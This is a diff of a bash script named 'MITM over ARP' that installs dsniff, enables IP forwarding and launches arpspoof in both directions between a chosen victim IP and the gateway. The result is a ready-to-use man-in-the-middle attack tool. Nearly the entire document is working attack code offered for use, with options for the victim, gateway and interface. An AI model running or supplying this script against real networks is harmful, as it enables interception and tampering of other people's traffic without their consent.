@@ -12,30 +12,42 @@ BOLD='\033[1m'
 BLINK='\033[5m'
 UNDERLINE='\033[4m'
 
-#check for packages
-pth=$(which dsniff)
-if [ -z "$pth" ]
-then
-      sudo apt install dsniff
-fi
+#defining globals
+script_name=$0
 
-#Enable IP forwading
-sudo sysctl -w net.ipv4.ip_forward=1
-
+#check for empty parameters 
+#if [ $# -ne 1 ]; then
+#	echo -e "${BOLD}${GREEN}[+] Usage :sudo $script_name -o <> -t<> -i <interface> ${NONE}"
+#	exit
+#fi
+echo -e "${BOLD}${GREEN}MITM over ARP ${NONE}"
+echo -e "${BOLD}[+] Coded By @whokilleddb ${NONE}"
 #getting variables from command line
 while test $# -gt 0; do
            case "$1" in
-                -o)
+				-h|--help)
+				      echo -e "${BOLD}$script_name - MITM over ARP ${NONE}"
+				      echo " "
+				      echo "sudo $script_name [options] [arguments]"
+				      echo " "
+				      echo "[+] Options:"
+				      echo "	-h, --help                show brief help"
+				      echo "	-i, --interface           interface to spoof over"
+				      echo "	-o, --ori                 ip to spoof"
+				      echo "	-t, --tgt                 gateway ip"
+				      exit 0
+				      ;;
+                -o|--ori)
                     shift
                     ori_ip=$1
                     shift
                     ;;
-                -t)
+                -t|--tgt)
                     shift
                     spoof_ip=$1
                     shift
                     ;;
-                -i)
+                -i|--inter)
                     shift
                     inter=$1
                     shift
@@ -47,11 +59,50 @@ while test $# -gt 0; do
           esac
 done  
 
-echo "Original IP : $ori_ip";
-echo "IP to Spoof : $spoof_ip";
-echo "Interface : $inter"
+#check for packages
+pth=""
+pth=$(which dsniff)
+if [ -z "$pth" ]
+then
+	apt install dsniff
+fi
+
+pth=""
+pth=$(which parallel)
+if [ -z "$pth" ]
+then
+	apt install parallel
+fi
+
+pth=""
+pth=$(which xterm)
+if [ -z "$pth" ]
+then
+	apt install xterm
+fi
 
 
-xterm -hold -e sudo $(which arpspoof) -i $inter -t $ori_ip $spoof_ip
+#Enable IP forwading
+sysctl -w net.ipv4.ip_forward=1
+if [[ -z "$ori_ip" || -z "spoof_ip" || -z "$inter" ]]
+then
+     echo -e "${BOLD}$script_name - MITM over ARP ${NONE}"
+     echo " "
+     echo "sudo $script_name [options] [arguments]"
+     echo " "
+     echo "[+] Options:"
+     echo "	-h, --help                show brief help"
+     echo "	-i, --interface           interface to spoof over"
+     echo "	-o, --ori                 ip to spoof"
+     echo "	-t, --tgt                 gateway ip"
+     exit 0
+fi
 
-xterm -hold -e sudo $(which arpspoof) -i $inter -t $spoof_ip $ori_ip
+echo -e "${PURPLE}[+] IP to Spoof   : $ori_ip${NONE}";
+echo -e "${YELLOW}[+] IP of Gateway : $spoof_ip${NONE}";
+echo -e "${CYAN}[+]Interface      : $inter${NONE}"
+
+echo -e "${GREEN}[+] Telling $ori_ip that I am $spoof_ip ${NONE}"
+xterm -e $(which arpspoof) -i $inter -t $ori_ip $spoof_ip &
+echo -e "${RED}[+] Telling $spoof_ip that I am $ori_ip ${NONE}"
+xterm -e $(which arpspoof) -i $inter -t $spoof_ip $ori_ip
